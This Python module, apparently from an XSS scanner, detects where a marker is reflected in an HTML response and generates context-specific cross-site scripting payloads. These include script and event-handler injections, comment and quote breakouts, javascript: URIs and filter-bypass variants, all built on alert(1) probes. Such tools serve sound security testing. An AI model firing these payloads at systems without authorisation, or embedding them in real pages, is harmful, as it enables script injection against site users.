"""
XSS Context Detection Module
Detects the context where user input is reflected and generates context-specific payloads
"""

import re
from bs4 import BeautifulSoup
from colorama import Fore, Style


class XSSContextDetector:
    """XSS Context Detection"""
    
    # Detection patterns for different contexts
    CONTEXTS = {
        'HTML': r'<[^>]*>{marker}',
        'ATTRIBUTE': r'<[^>]+\s+\w+=["\']?[^"\'<>]*{marker}[^"\'<>]*["\']?',
        'JAVASCRIPT_STRING': r'<script[^>]*>.*?["\'][^"\']*{marker}[^"\']*["\'].*?</script>',
        'JAVASCRIPT_CODE': r'<script[^>]*>.*?{marker}.*?</script>',
        'URL': r'href=["\']?[^"\'<>]*{marker}[^"\'<>]*["\']?',
        'CSS': r'<style[^>]*>.*?{marker}.*?</style>',
        'COMMENT': r'<!--.*?{marker}.*?-->'
    }
    
    def __init__(self):
        self.detected_contexts = []
    
    def detect_contexts(self, marker, response_text):
        """
        Detect all contexts where the marker appears in the response
        
        Args:
            marker: Unique marker string injected
            response_text: HTML response text
            
        Returns:
            List of detected contexts with positions
        """
        contexts = []
        
        # First, find all occurrences of marker
        marker_positions = [m.start() for m in re.finditer(re.escape(marker), response_text)]
        
        if not marker_positions:
            return []
        
        # For each occurrence, determine context
        for pos in marker_positions:
            context_info = self._determine_context(marker, pos, response_text)
            if context_info:
                contexts.append(context_info)
        
        self.detected_contexts = contexts
        return contexts
    
    def _determine_context(self, marker, position, html):
        """Determine the context of a marker at a specific position"""
        # Extract surrounding context (200 chars before and after)
        start = max(0, position - 200)
        end = min(len(html), position + len(marker) + 200)
        context_snippet = html[start:end]
        
        context_type = None
        details = {}
        
        # Check each context type
        if self._is_in_comment(position, html):
            context_type = 'COMMENT'
            details = {'risk': 'Low', 'reason': 'Inside HTML comment'}
        
        elif self._is_in_script_tag(position, html):
            if self._is_in_js_string(position, html):
                context_type = 'JAVASCRIPT_STRING'
                quote_type = self._get_surrounding_quote(position, html)
                details = {
                    'risk': 'Critical',
                    'quote': quote_type,
                    'reason': f'Inside JavaScript string with {quote_type} quotes'
                }
            else:
                context_type = 'JAVASCRIPT_CODE'
                details = {'risk': 'Critical', 'reason': 'Inside JavaScript code'}
        
        elif self._is_in_style_tag(position, html):
            context_type = 'CSS'
            details = {'risk': 'Medium', 'reason': 'Inside CSS style block'}
        
        elif self._is_in_attribute(position, html):
            context_type = 'ATTRIBUTE'
            attr_info = self._get_attribute_info(position, html)
            details = {
                'risk': 'High',
                'attribute': attr_info.get('name', 'unknown'),
                'quote': attr_info.get('quote', 'none'),
                'tag': attr_info.get('tag', 'unknown'),
                'reason': f'Inside {attr_info.get("tag", "unknown")} tag attribute'
            }
            
            # Higher risk for event handlers or href
            if attr_info.get('name', '').startswith('on'):
                details['risk'] = 'Critical'
                details['reason'] = f'Inside event handler: {attr_info.get("name")}'
            elif attr_info.get('name') in ['href', 'src', 'action']:
                details['risk'] = 'Critical'
                details['reason'] = f'Inside URL attribute: {attr_info.get("name")}'
        
        else:
            # Check if breaking out of comment first
            if self._is_breaking_comment(position, html):
                context_type = 'HTML_COMMENT_BREAKOUT'
                html_details = self._analyze_html_context(position, html)
                details = {
                    'risk': 'Critical',
                    'reason': 'Breaking out of HTML comment to inject malicious code',
                    'parent_tag': html_details.get('parent_tag', 'unknown'),
                    'exact_location': 'Comment breakout sequence detected',
                    'exploitability': 'Can escape comment context using --> and inject scripts',
                    'breakout_method': 'HTML comment escape (-->)'
                }
            else:
                # Default to HTML context - analyze more details
                context_type = 'HTML'
                html_details = self._analyze_html_context(position, html)
                details = {
                    'risk': 'High',
                    'reason': html_details.get('reason', 'Inside HTML content'),
                    'parent_tag': html_details.get('parent_tag', 'unknown'),
                    'exact_location': html_details.get('exact_location', 'Between tags'),
                    'exploitability': html_details.get('exploitability', 'Direct script injection possible')
                }
        
        return {
            'type': context_type,
            'position': position,
            'snippet': context_snippet,
            'details': details
        }
    
    def _is_in_comment(self, position, html):
        """Check if position is inside HTML comment"""
        # Find last <!-- before position
        comment_start = html.rfind('<!--', 0, position)
        if comment_start == -1:
            return False
        
        # Find matching -->
        comment_end = html.find('-->', comment_start)
        return comment_end > position if comment_end != -1 else True
    
    def _is_breaking_comment(self, position, html):
        """Check if the injection is breaking out of HTML comment"""
        # Look for --> pattern near the position
        before = html[max(0, position-10):position+50]
        after = html[position:min(len(html), position+50)]
        
        # Check if we see --> in the surrounding area
        if '-->' in before or '-->' in after:
            # Verify we're initially in a comment
            comment_start = html.rfind('<!--', 0, position)
            if comment_start != -1:
                # Find if there's a --> before our position
                comment_end = html.find('-->', comment_start)
                # If --> appears after or around our position, it's likely a breakout
                if comment_end >= position - 10:
                    return True
        return False
    
    def _is_in_script_tag(self, position, html):
        """Check if position is inside <script> tag"""
        script_start = html.rfind('<script', 0, position)
        if script_start == -1:
            return False
        
        script_end = html.find('</script>', script_start)
        return script_end > position if script_end != -1 else True
    
    def _is_in_style_tag(self, position, html):
        """Check if position is inside <style> tag"""
        style_start = html.rfind('<style', 0, position)
        if style_start == -1:
            return False
        
        style_end = html.find('</style>', style_start)
        return style_end > position if style_end != -1 else True
    
    def _is_in_js_string(self, position, html):
        """Check if position is inside a JavaScript string literal"""
        # Find the script tag
        script_start = html.rfind('<script', 0, position)
        if script_start == -1:
            return False
        
        script_content_start = html.find('>', script_start) + 1
        script_end = html.find('</script>', script_start)
        
        # Get script content up to position
        script_before = html[script_content_start:position]
        
        # Count quotes
        single_quotes = script_before.count("'") - script_before.count("\\'")
        double_quotes = script_before.count('"') - script_before.count('\\"')
        
        # If odd number of quotes, we're inside a string
        return (single_quotes % 2 == 1) or (double_quotes % 2 == 1)
    
    def _get_surrounding_quote(self, position, html):
        """Get the type of quote surrounding the position"""
        before = html[max(0, position-100):position]
        
        last_single = before.rfind("'")
        last_double = before.rfind('"')
        
        if last_single > last_double:
            return "single"
        elif last_double > last_single:
            return "double"
        return "none"
    
    def _is_in_attribute(self, position, html):
        """Check if position is inside an HTML attribute"""
        # Find the last < before position
        tag_start = html.rfind('<', 0, position)
        if tag_start == -1:
            return False
        
        # Find the matching >
        tag_end = html.find('>', tag_start)
        if tag_end == -1 or tag_end < position:
            return False
        
        # Check if position is between = and space/> within the tag
        tag_content = html[tag_start:tag_end]
        relative_pos = position - tag_start
        
        # Check if there's an = before our position
        equal_before = tag_content.rfind('=', 0, relative_pos)
        if equal_before == -1:
            return False
        
        # Check if there's a space or tag end after equal sign
        after_equal = tag_content[equal_before+1:relative_pos]
        return '>' not in after_equal
    
    def _analyze_html_context(self, position, html):
        """Analyze HTML context in detail"""
        # Find surrounding tags
        before_html = html[:position]
        after_html = html[position:]
        
        # Find parent tag
        last_open_tag = None
        tag_matches = re.finditer(r'<(\w+)[^>]*>', before_html)
        for match in tag_matches:
            last_open_tag = match.group(1)
        
        # Check if between tags
        next_tag = re.search(r'<(/?\w+)', after_html)
        next_tag_name = next_tag.group(1) if next_tag else None
        
        # Determine exact location
        if before_html.rstrip().endswith('>') and after_html.lstrip().startswith('<'):
            exact_location = 'Between HTML tags'
            reason = f'Reflected between tags in <{last_open_tag}> element'
            exploitability = 'Can inject <script> or event handlers directly'
        elif before_html.rstrip().endswith('>'):
            exact_location = 'After opening tag'
            reason = f'Reflected immediately after <{last_open_tag}> tag'
            exploitability = 'Can close current context and inject malicious tags'
        else:
            exact_location = 'Within text content'
            reason = f'Reflected as text content inside <{last_open_tag or "body"}> element'
            exploitability = 'Standard XSS injection works here'
        
        return {
            'parent_tag': last_open_tag or 'body',
            'exact_location': exact_location,
            'reason': reason,
            'exploitability': exploitability,
            'next_tag': next_tag_name
        }
    
    def _get_attribute_info(self, position, html):
        """Get detailed information about the attribute"""
        # Find the tag
        tag_start = html.rfind('<', 0, position)
        tag_end = html.find('>', tag_start)
        tag_content = html[tag_start:tag_end+1]
        
        # Extract tag name
        tag_match = re.search(r'<(\w+)', tag_content)
        tag_name = tag_match.group(1) if tag_match else 'unknown'
        
        # Find attribute name
        relative_pos = position - tag_start
        before_pos = tag_content[:relative_pos]
        
        attr_match = re.search(r'(\w+)\s*=\s*["\']?[^"\'>\s]*$', before_pos)
        attr_name = attr_match.group(1) if attr_match else 'unknown'
        
        # Determine quote type
        quote_type = 'none'
        if '"' in before_pos.split('=')[-1]:
            quote_type = 'double'
        elif "'" in before_pos.split('=')[-1]:
            quote_type = 'single'
        
        return {
            'tag': tag_name,
            'name': attr_name,
            'quote': quote_type
        }
    
    def generate_context_payloads(self, contexts):
        """
        Generate optimized payloads for detected contexts
        
        Args:
            contexts: List of detected contexts
            
        Returns:
            Dict mapping context types to payloads
        """
        payloads = {}
        
        for ctx in contexts:
            ctx_type = ctx['type']
            ctx_details = ctx['details']
            
            if ctx_type not in payloads:
                payloads[ctx_type] = []
            
            # Generate context-specific payloads
            if ctx_type == 'HTML':
                payloads[ctx_type].extend(self._generate_html_payloads())
            
            elif ctx_type == 'HTML_COMMENT_BREAKOUT':
                # Use comment breakout specific payloads
                payloads[ctx_type] = [
                    '--><script>alert(1)</script><!--',
                    '--><img src=x onerror=alert(1)><!--',
                    '--><svg onload=alert(1)><!--',
                    '--></div><script>alert(1)</script><div><!--',
                    '-->"><script>alert(1)</script>"<!--'
                ]
            
            elif ctx_type == 'ATTRIBUTE':
                payloads[ctx_type].extend(
                    self._generate_attribute_payloads(
                        ctx_details.get('quote', 'none'),
                        ctx_details.get('attribute', 'unknown')
                    )
                )
            
            elif ctx_type == 'JAVASCRIPT_STRING':
                payloads[ctx_type].extend(
                    self._generate_js_string_payloads(
                        ctx_details.get('quote', 'double')
                    )
                )
            
            elif ctx_type == 'JAVASCRIPT_CODE':
                payloads[ctx_type].extend(self._generate_js_code_payloads())
            
            elif ctx_type == 'URL':
                payloads[ctx_type].extend(self._generate_url_payloads())
            
            elif ctx_type == 'CSS':
                payloads[ctx_type].extend(self._generate_css_payloads())
        
        return payloads
    
    def _generate_html_payloads(self):
        """Generate payloads for HTML context"""
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>'
        ]
        
        # Add comment breakout payloads
        payloads.extend([
            '--><script>alert(1)</script><!--',
            '--><img src=x onerror=alert(1)><!--',
            '--><svg onload=alert(1)><!--'
        ])
        
        return payloads
    
    def _generate_attribute_payloads(self, quote_type, attr_name):
        """Generate payloads for attribute context"""
        payloads = []
        
        if quote_type == 'double':
            payloads.extend([
                '" onload="alert(1)',
                '" onfocus="alert(1)" autofocus="',
                '"><script>alert(1)</script><a href="',
                '" onclick="alert(1)',
                '"><img src=x onerror=alert(1)><a href="'
            ])
        elif quote_type == 'single':
            payloads.extend([
                "' onload='alert(1)",
                "' onfocus='alert(1)' autofocus='",
                "'><script>alert(1)</script><a href='",
                "' onclick='alert(1)",
                "'><img src=x onerror=alert(1)><a href='"
            ])
        else:  # No quotes
            payloads.extend([
                ' onload=alert(1) x=',
                '><script>alert(1)</script><a href=',
                ' onfocus=alert(1) autofocus x='
            ])
        
        # Special payloads for href/src attributes
        if attr_name in ['href', 'src', 'action']:
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'jAvAsCrIpT:alert(1)'  # Case variation
            ])
        
        return payloads
    
    def _generate_js_string_payloads(self, quote_type):
        """Generate payloads for JavaScript string context"""
        payloads = []
        
        if quote_type == 'double':
            payloads.extend([
                '"; alert(1); //',
                '"; alert(1); var x="',
                '"; alert(String.fromCharCode(88,83,83)); //',
                '\"; alert(1); //'
            ])
        else:  # single
            payloads.extend([
                "'; alert(1); //",
                "'; alert(1); var x='",
                "'; alert(String.fromCharCode(88,83,83)); //",
                "\\'; alert(1); //"
            ])
        
        return payloads
    
    def _generate_js_code_payloads(self):
        """Generate payloads for JavaScript code context"""
        return [
            'alert(1)',
            ';alert(1);',
            '});alert(1);({',
            'alert(String.fromCharCode(88,83,83))',
            '};alert(1);//'
        ]
    
    def _generate_url_payloads(self):
        """Generate payloads for URL context"""
        return [
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            'data:text/html,<script>alert(1)</script>',
            'jAvAsCrIpT:alert(1)',  # Bypass filters
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'  # HTML entities
        ]
    
    def _generate_css_payloads(self):
        """Generate payloads for CSS context"""
        return [
            '</style><script>alert(1)</script><style>',
            '};alert(1);{',
            'expression(alert(1))',  # IE only
            'behavior:url(xss.htc)'
        ]
    
    def print_context_analysis(self):
        """Print detailed context analysis"""
        if not self.detected_contexts:
            print(f"{Fore.YELLOW}[*] No contexts detected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Context Detection Analysis{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        for i, ctx in enumerate(self.detected_contexts, 1):
            risk = ctx['details'].get('risk', 'Unknown')
            risk_color = {
                'Critical': Fore.RED,
                'High': Fore.YELLOW,
                'Medium': Fore.BLUE,
                'Low': Fore.GREEN
            }.get(risk, Fore.WHITE)
            
            print(f"{risk_color}[{i}] Context Type: {ctx['type']} (Risk: {risk}){Style.RESET_ALL}")
            print(f"    Position: {ctx['position']}")
            print(f"    Reason: {ctx['details'].get('reason', 'N/A')}")
            
            if ctx['type'] in ['HTML', 'HTML_COMMENT_BREAKOUT']:
                print(f"    Parent Tag: <{ctx['details'].get('parent_tag', 'unknown')}>")
                print(f"    Location: {ctx['details'].get('exact_location', 'N/A')}")
                print(f"    Exploitability: {ctx['details'].get('exploitability', 'N/A')}")
                if 'breakout_method' in ctx['details']:
                    print(f"    Breakout Method: {ctx['details'].get('breakout_method')}")
            elif ctx['type'] == 'ATTRIBUTE':
                print(f"    Tag: <{ctx['details'].get('tag', 'unknown')}>")
                print(f"    Attribute: {ctx['details'].get('attribute', 'unknown')}")
                print(f"    Quote Type: {ctx['details'].get('quote', 'none')}")
            elif ctx['type'] in ['JAVASCRIPT_STRING', 'JAVASCRIPT_CODE']:
                if 'quote' in ctx['details']:
                    print(f"    Quote Type: {ctx['details'].get('quote')}")
            
            # Show snippet (truncate if too long)
            snippet = ctx['snippet']
            if len(snippet) > 120:
                snippet = snippet[:117] + '...'
            # Clean up snippet for better display
            snippet = ' '.join(snippet.split())  # Normalize whitespace
            print(f"    Evidence Snippet: {snippet}")
            print()
        
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
